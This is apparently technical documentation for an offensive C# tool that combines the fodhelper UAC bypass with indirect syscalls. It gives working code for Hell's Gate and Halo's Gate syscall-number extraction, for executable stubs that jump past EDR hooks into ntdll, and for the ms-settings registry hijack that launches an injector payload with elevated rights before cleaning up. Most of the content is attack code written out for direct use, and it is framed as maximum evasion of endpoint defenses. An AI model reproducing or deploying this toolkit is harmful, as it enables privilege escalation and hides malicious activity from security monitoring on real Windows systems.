# Indirect Syscalls Implementation - Technical Documentation

## Overview

This project implements **true indirect syscalls** for the fodhelper UAC bypass technique. All Windows API operations bypass userland hooks by jumping directly to syscall instructions within ntdll.dll, providing maximum EDR evasion.

## Table of Contents

1. [How Indirect Syscalls Work](#how-indirect-syscalls-work)
2. [Code Architecture](#code-architecture)
3. [Implementation Details](#implementation-details)
4. [EDR Evasion Techniques](#edr-evasion-techniques)

---

## How Indirect Syscalls Work

### The Problem: EDR Userland Hooks

Modern EDRs hook Windows APIs at multiple levels:
- **IAT hooks**: Modify Import Address Table entries
- **EAT hooks**: Modify Export Address Table entries  
- **Inline hooks**: Patch the first bytes of functions (function prologue)
- **Deep inline hooks**: Patch deeper into function bodies

### Normal NT Function in ntdll.dll

When you examine a typical NT function like `NtCreateKey` in ntdll.dll:

```asm
NtCreateKey:
    mov r10, rcx        ; Save first parameter (Windows x64 fastcall)
    mov eax, 0x1C       ; Load syscall number (SSN) - varies by Windows version
    test byte [SharedUserData+0x308], 1
    jne short SystemCallStub
    syscall             ; ← THE ACTUAL SYSCALL INSTRUCTION at offset +0x12
    ret
```

**Typical EDR Hook Location:**
```asm
NtCreateKey:
    jmp QWORD PTR [rip+0x1234]  ; EDR patches these first bytes
    ; ... rest of function unreachable
```

### Our Indirect Syscall Solution

Instead of calling the function normally, we:

#### Step 1: Extract Information at Runtime

```csharp
IntPtr funcAddr = GetFunctionAddress("NtCreateKey");
// Result: 0x7FFD4DB81C20 (function start address)

uint ssn = GetSyscallNumber(funcAddr);
// Reads bytes at offset +4, extracts: 0x1C

IntPtr syscallAddr = FindSyscallInstruction(funcAddr);
// Searches for 0x0F 0x05 bytes, finds: 0x7FFD4DB81C32 (function start + 0x12)
```

#### Step 2: Build Custom Assembly Stub

We dynamically generate this 21-byte assembly stub:

```asm
; Our custom stub in memory:
mov r10, rcx              ; Byte 0-2:  0x4C 0x8B 0xD1
                          ; Save RCX per syscall convention

mov eax, 0x1C             ; Byte 3-7:  0xB8 + 4-byte SSN
                          ; Load the syscall number we extracted

mov r11, 0x7FFD4DB81C32   ; Byte 8-17: 0x49 0xBB + 8-byte address
                          ; Load address of syscall instruction in ntdll

jmp r11                   ; Byte 18-20: 0x41 0xFF 0xE3
                          ; Jump directly to that syscall instruction
```

#### Step 3: Execute via Delegate

```csharp
unsafe
{
    fixed (byte* p = stub)
    {
        IntPtr addr = (IntPtr)p;
        VirtualProtect(addr, (uint)stub.Length, 0x40, out _); // Make executable
        
        var del = Marshal.GetDelegateForFunctionPointer<NtCreateKeyDelegate>(addr);
        uint result = del(out keyHandle, desiredAccess, ref objAttr, ...);
    }
}
```

### Execution Flow

```
Your Code → Our Stub → ntdll syscall instruction → Kernel
   ↓           ↓              ↓                      ↓
Program    [mov r10,rcx]  [syscall]              NT Kernel
           [mov eax,SSN]  [ret] ←─────────────┐  executes
           [mov r11,addr]                      │  NtCreateKey
           [jmp r11] ──────────────────────────┘
```

**Key Points:**
- We prepare the registers ourselves (`r10`, `eax`)
- We **jump** to the `syscall` instruction (not the function start)
- The `ret` after `syscall` returns to **our caller** (not back to our stub)
- Call stack shows: `YourCode → ntdll!NtCreateKey+0x12` (looks legitimate!)

### Why This Works

**Bypasses all common EDR hooks:**

```
❌ Normal API call:
YourCode → NtCreateKey → [HOOKED: JMP to EDR] → EDR analyzes/blocks

✅ Our indirect syscall:
YourCode → OurStub → NtCreateKey+0x12 (syscall instruction) → Kernel
                     ↑ Skips the hooked prologue!
```

### Register State & Calling Convention

**Windows x64 calling convention (fastcall):**
- **RCX** = 1st parameter
- **RDX** = 2nd parameter
- **R8** = 3rd parameter
- **R9** = 4th parameter
- **Stack** = 5th+ parameters

**Syscall convention:**
- **R10** = 1st parameter (that's why we `mov r10, rcx`)
- **RDX, R8, R9, Stack** = same as function call
- **EAX** = syscall number

Our stub translates from Windows calling convention to syscall convention before jumping to the syscall instruction.

---

## Code Architecture

### Project Structure

```
FODHelperUACBypass_NG/
├── Program.cs           # Main entry point, orchestrates the UAC bypass
├── Native.cs            # Indirect syscall infrastructure and NT API wrappers
├── Helpers.cs           # High-level helper functions for registry, processes, etc.
├── TestSyscalls.cs      # Diagnostic tests for syscall functionality
└── Properties/
    └── AssemblyInfo.cs
```

### Native.cs - Syscall Infrastructure

**Core Components:**

1. **SSN Extraction (Hell's Gate / Halo's Gate)**
   ```csharp
   private static uint GetSyscallNumber(IntPtr functionAddress)
   {
       byte[] buffer = new byte[32];
       Marshal.Copy(functionAddress, buffer, 0, 32);
       
       // Check for clean syscall stub: mov r10, rcx; mov eax, SSN
       if (buffer[0] == 0x4C && buffer[1] == 0x8B && 
           buffer[2] == 0xD1 && buffer[3] == 0xB8)
       {
           return BitConverter.ToUInt32(buffer, 4); // Extract SSN
       }
       
       // If hooked, use Halo's Gate (search nearby functions)
       return GetSyscallNumberHalosGate(functionAddress);
   }
   ```

2. **Syscall Instruction Locator**
   ```csharp
   private static IntPtr FindSyscallInstruction(IntPtr functionAddress)
   {
       for (int i = 0; i < 100; i++)
       {
           byte[] buffer = new byte[2];
           Marshal.Copy(functionAddress + i, buffer, 0, 2);
           
           if (buffer[0] == 0x0F && buffer[1] == 0x05) // syscall opcode
           {
               return functionAddress + i;
           }
       }
       throw new Exception("Failed to find syscall instruction");
   }
   ```

3. **Stub Generator**
   ```csharp
   private static byte[] CreateIndirectSyscallStub(uint ssn, IntPtr syscallAddr)
   {
       byte[] stub = new byte[21];
       
       // mov r10, rcx
       stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1;
       
       // mov eax, ssn
       stub[3] = 0xB8;
       BitConverter.GetBytes(ssn).CopyTo(stub, 4);
       
       // mov r11, syscall_address
       stub[8] = 0x49; stub[9] = 0xBB;
       BitConverter.GetBytes(syscallAddr.ToInt64()).CopyTo(stub, 10);
       
       // jmp r11
       stub[18] = 0x41; stub[19] = 0xFF; stub[20] = 0xE3;
       
       return stub;
   }
   ```

4. **Execution Engine**
   ```csharp
   private static uint ExecuteSyscall<T>(ref byte[] stub, string functionName, 
                                         Func<T, uint> invoke) where T : Delegate
   {
       if (stub == null)
       {
           IntPtr funcAddr = GetFunctionAddress(functionName);
           uint ssn = GetSyscallNumber(funcAddr);
           IntPtr syscallAddr = FindSyscallInstruction(funcAddr);
           stub = CreateIndirectSyscallStub(ssn, syscallAddr);
       }
       
       unsafe
       {
           fixed (byte* p = stub)
           {
               IntPtr addr = (IntPtr)p;
               VirtualProtect(addr, (uint)stub.Length, 0x40, out _);
               return invoke(Marshal.GetDelegateForFunctionPointer<T>(addr));
           }
       }
   }
   ```

5. **Public API Wrappers**
   ```csharp
   public static uint NtCreateKey(
       out IntPtr keyHandle,
       uint desiredAccess,
       ref OBJECT_ATTRIBUTES objectAttributes,
       uint titleIndex,
       IntPtr classPtr,
       uint createOptions,
       out uint disposition)
   {
       IntPtr hKey = IntPtr.Zero;
       uint disp = 0;
       OBJECT_ATTRIBUTES objAttr = objectAttributes;
       
       uint result = ExecuteSyscall<NtCreateKeyDelegate>(
           ref _stubNtCreateKey, "NtCreateKey",
           d => d(out hKey, desiredAccess, ref objAttr, titleIndex, 
                  classPtr, createOptions, out disp));
       
       keyHandle = hKey;
       disposition = disp;
       objectAttributes = objAttr;
       return result;
   }
   ```

### Helpers.cs - High-Level Operations

**Registry Operations:**

```csharp
public static bool CreateRegistryKey(string keyPath, out IntPtr keyHandle, out uint statusCode)
{
    // 1. Recursively create parent keys
    string[] parts = keyPath.Split('\\');
    for (int i = 0; i < parts.Length - 1; i++)
    {
        string parentPath = string.Join("\\", parts.Take(i + 1));
        // Create/open parent key via NtCreateKey syscall
    }
    
    // 2. Create final key
    string ntPath = GetCurrentUserRegistryPath(keyPath);
    // Format: \Registry\User\{SID}\Software\Classes\...
    
    Native.UNICODE_STRING keyName = CreateUnicodeString(ntPath);
    Native.OBJECT_ATTRIBUTES objAttr = InitializeObjectAttributes(
        ref keyName, Native.OBJ_CASE_INSENSITIVE | Native.OBJ_OPENIF);
    
    // 3. Call NtCreateKey via indirect syscall
    statusCode = Native.NtCreateKey(out keyHandle, Native.KEY_ALL_ACCESS, ...);
    
    return statusCode == Native.STATUS_SUCCESS;
}
```

**Process Launch:**

```csharp
public static bool StartProcess(string executablePath, out string errorMsg)
{
    // Use ShellExecuteEx to handle auto-elevation properly
    // (fodhelper.exe requires elevation)
    SHELLEXECUTEINFO sei = new SHELLEXECUTEINFO();
    sei.lpFile = fullPath;
    sei.lpVerb = "open"; // Allows auto-elevation
    
    bool success = ShellExecuteEx(ref sei);
    
    if (success && sei.hProcess != IntPtr.Zero)
    {
        Native.NtClose(sei.hProcess); // Close via syscall
    }
    
    return success;
}
```

### Program.cs - Main Execution Flow

```csharp
static void Main(string[] args)
{
    string keyPath = @"Software\Classes\ms-settings\Shell\Open\command";
    string payload = @"c:\temp\evasivesyscallinjector.exe ...";
    
    // 1. Create hijacked registry key via indirect syscalls
    if (Helpers.CreateRegistryKey(keyPath, out IntPtr keyHandle, out uint status))
    {
        // 2. Set DelegateExecute value
        Helpers.SetRegistryValue(keyHandle, "DelegateExecute", "");
        
        // 3. Set default value to payload command
        Helpers.SetRegistryValue(keyHandle, "", payload);
        
        Native.NtClose(keyHandle);
    }
    
    // 4. Sleep via NtDelayExecution syscall
    Helpers.Sleep(10000);
    
    // 5. Launch fodhelper (triggers UAC bypass)
    Helpers.StartProcess("fodhelper.exe");
    
    // 6. Cleanup - delete registry key via syscall
    Helpers.Sleep(5000);
    Helpers.DeleteRegistryKey(keyPath);
}
```

---

## Implementation Details

### Syscall Number Extraction: Hell's Gate & Halo's Gate

**Hell's Gate (Clean Functions):**
```csharp
// Read function prologue
byte[] buffer = new byte[32];
Marshal.Copy(functionAddress, buffer, 0, 32);

// Pattern: 4C 8B D1 B8 [SSN] [SSN] [SSN] [SSN]
//          mov r10,rcx  mov eax, <32-bit SSN>
if (buffer[0] == 0x4C && buffer[1] == 0x8B && 
    buffer[2] == 0xD1 && buffer[3] == 0xB8)
{
    return BitConverter.ToUInt32(buffer, 4);
}
```

**Halo's Gate (Hooked Functions):**
```csharp
// If function is hooked, search nearby functions
for (int offset = 32; offset < 500; offset += 32)
{
    // Check functions below in memory
    byte[] bufferDown = new byte[32];
    Marshal.Copy(functionAddress + offset, bufferDown, 0, 32);
    if (IsCleanSyscall(bufferDown))
    {
        uint nearbySSN = BitConverter.ToUInt32(bufferDown, 4);
        // Infer hooked function's SSN (functions are sequential)
        return nearbySSN - (uint)(offset / 32);
    }
}
```

### Stub Caching & Lazy Initialization

```csharp
private static byte[] _stubNtCreateKey;  // null until first use

// First call:
// 1. Resolve function address
// 2. Extract SSN
// 3. Find syscall instruction
// 4. Generate stub
// 5. Cache it in _stubNtCreateKey

// Subsequent calls:
// - Reuse cached stub (fast!)
```

### Memory Protection

```csharp
unsafe
{
    fixed (byte* p = stub)
    {
        IntPtr addr = (IntPtr)p;
        
        // Make memory executable (PAGE_EXECUTE_READWRITE = 0x40)
        VirtualProtect(addr, (uint)stub.Length, 0x40, out _);
        
        // Execute from pinned managed array
        var del = Marshal.GetDelegateForFunctionPointer<T>(addr);
        return invoke(del);
    }
}
```

### NT Path Conversion

Registry keys must use NT object namespace format:

```csharp
// User input:
"Software\Classes\ms-settings\Shell\Open\command"

// Convert to NT path:
string sid = WindowsIdentity.GetCurrent().User.Value;
string ntPath = $"\\Registry\\User\\{sid}\\{keyPath}";

// Result:
"\\Registry\\User\\S-1-5-21-2925098041-1245980977-2650022770-1002\\Software\\Classes\\ms-settings\\Shell\\Open\\command"
```

### UNICODE_STRING Management

```csharp
public static UNICODE_STRING CreateUnicodeString(string str)
{
    byte[] bytes = Encoding.Unicode.GetBytes(str);
    IntPtr buffer = Marshal.AllocHGlobal(bytes.Length + 2);
    Marshal.Copy(bytes, 0, buffer, bytes.Length);
    Marshal.WriteInt16(buffer, bytes.Length, 0); // Null terminator
    
    return new UNICODE_STRING
    {
        Length = (ushort)bytes.Length,
        MaximumLength = (ushort)(bytes.Length + 2),
        Buffer = buffer
    };
}

// ALWAYS free after use!
public static void FreeUnicodeString(ref UNICODE_STRING unicodeString)
{
    if (unicodeString.Buffer != IntPtr.Zero)
    {
        Marshal.FreeHGlobal(unicodeString.Buffer);
        unicodeString.Buffer = IntPtr.Zero;
    }
}
```

---

## EDR Evasion Techniques

### 1. Bypasses IAT/EAT Hooks

**Traditional API call:**
```csharp
[DllImport("ntdll.dll")]
static extern uint NtCreateKey(...);
// ↓ Resolved at load time via IAT
// ↓ EDR can modify IAT entry to point to EDR code
```

**Our approach:**
```csharp
IntPtr funcAddr = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateKey");
// ↓ Runtime resolution via GetProcAddress
// ↓ Create delegate dynamically
// ↓ IAT never involved
```

### 2. Bypasses Inline Hooks

**Typical inline hook:**
```asm
NtCreateKey:
    jmp QWORD PTR [rip+EDR_Handler]  ; First bytes patched
    nop
    nop
    ; ... original code never executed
```

**Our bypass:**
```asm
; We jump to offset +0x12, skipping the hooked prologue:
NtCreateKey+0x12:
    syscall    ; ← We land here
    ret
```

### 3. Maintains Legitimate Call Stack

**Direct syscall detection:**
```
Call Stack:
YourProgram.exe!CustomStub
YourProgram.exe!Main
↑ Suspicious! Syscall from non-ntdll memory
```

**Our indirect syscall:**
```
Call Stack:
ntdll.dll!NtCreateKey+0x12
YourProgram.exe!Main
↑ Looks legitimate! Call came from ntdll
```

### 4. Runtime SSN Extraction

```csharp
// NO hardcoded syscall numbers (would break across Windows versions)
uint ssn = GetSyscallNumber(funcAddr);  // Extract at runtime

// Works on:
// - Windows 10 (all versions)
// - Windows 11 (all versions)
// - Windows Server (all versions)
```

### 5. Avoids Suspicious API Sequences

**Detected pattern:**
```csharp
// High-entropy sequence = red flag
OpenProcess()
VirtualAllocEx()
WriteProcessMemory()
CreateRemoteThread()
```

**Our approach:**
```csharp
// Registry operations via syscalls (different sequence)
NtCreateKey()
NtSetValueKey()
NtDeleteKey()
```

---

## Technical References

### Syscall Numbers by Windows Version

| Function | Win10 1909 | Win10 21H2 | Win11 22H2 |
|----------|------------|------------|------------|
| NtClose | 0x0F | 0x0F | 0x0F |
| NtCreateKey | 0x1C | 0x1C | 0x1D |
| NtSetValueKey | 0x96 | 0x96 | 0x98 |
| NtDeleteKey | 0x3F | 0x3F | 0x40 |
| NtDelayExecution | 0x34 | 0x34 | 0x34 |

*Note: We extract these at runtime, so version-specific numbers don't matter!*

### Relevant NTSTATUS Codes

| Code | Name | Meaning |
|------|------|---------|
| 0x00000000 | STATUS_SUCCESS | Operation successful |
| 0xC0000034 | STATUS_OBJECT_NAME_NOT_FOUND | Registry key doesn't exist |
| 0xC0000022 | STATUS_ACCESS_DENIED | Insufficient permissions |
| 0xC0000035 | STATUS_OBJECT_NAME_COLLISION | Key already exists |

---

*Last Updated: 2026-03-02*
